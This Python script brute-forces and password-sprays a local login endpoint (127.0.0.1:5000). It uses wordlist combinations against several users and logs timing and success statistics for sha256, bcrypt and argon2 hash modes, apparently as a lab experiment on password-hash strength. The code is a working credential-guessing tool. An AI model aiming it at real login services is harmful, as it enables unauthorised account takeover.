import requests
import json
import time

LOGIN_URL = "http://127.0.0.1:5000/login"
PASSWORDS_FILE = "passwords.txt"
USERS_JSON = "users.json"
session = requests.Session()

def load_words(path, limit=10000):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [w.strip() for w in f if w.strip()][:limit]

def password_generator(words, max_attempts=50000):
    count = 0

    for w in words:
        yield w
        count += 1
        if count >= max_attempts:
            return

    for w1 in words:
        for w2 in words:
            yield w1 + w2
            count += 1
            if count >= max_attempts:
                return
    for w1 in words:
        for w2 in words:
            for w3 in words:
                yield w1 + w2 + w3
                count += 1
                if count >= max_attempts:
                    return


def try_login(username, password, hash_mode):
    try:
        response = session.post(
            LOGIN_URL,
            data={
                "username": username,
                "password": password,
                "hash_mode": hash_mode
            }
        )

        return "Welcome" in response.text or "test" in response.url

    except requests.RequestException as e:
        print("ERROR occured in the server:" + str(e))
        return False


def bruteforce(username, hash_mode):
    words = load_words(PASSWORDS_FILE)
    count = 0

    for password in password_generator(words, max_attempts=50000):
        if try_login(username, password, hash_mode):
            return count
        count += 1

    return -1


def password_spraying(users, hash_mode):
    successful_cracks = {}
    with open(PASSWORDS_FILE, "r") as file:
        passwords = file.readlines()
        for line in passwords:
            line = line.rstrip("\n")
            for user in users:
                if try_login(user, line, hash_mode):
                    successful_cracks[user] = line
    return successful_cracks


def get_user_list():
    user_list = []
    with open(USERS_JSON, "r") as f:
        data = json.load(f)
    for user in data['users']:
        user_list.append(user['username'])
    user_list = user_list[:12]
    return user_list


def preform_bruteforce(hash_mode):
    total_tries = 0
    count_success = 0
    start = time.time()
    user_entries = []
    for user in get_user_list():
        print(user)
        user_start = time.time()
        tries = bruteforce(user, hash_mode)
        user_end = time.time() - user_start
        status = "Success" if tries > 0 else "Fail"
        user_entry = {"Username": user, "Time_elapsed": user_end, "Hash_mode": hash_mode, "Status": status}
        user_entries.append(user_entry)
        if tries > 0:
            total_tries += tries
            count_success += 1
    end = time.time() - start
    # also return analytics
    return total_tries, end, count_success, user_entries


def main():
    hash_modes = ["sha256", "bcrypt", "argon2"]
    total_tries, end, count_success, user_entries = preform_bruteforce(hash_modes[0])
    # also add analytics
    brute_json = {"Total_tries": total_tries,
                  "Time_elapsed": end,
                  "Tries_per_sec": int(total_tries / end),
                  "Success_rate": (count_success / len(get_user_list()) * 100),
                  "User_entries": user_entries}
    print(brute_json)


if __name__ == "__main__":
    main()
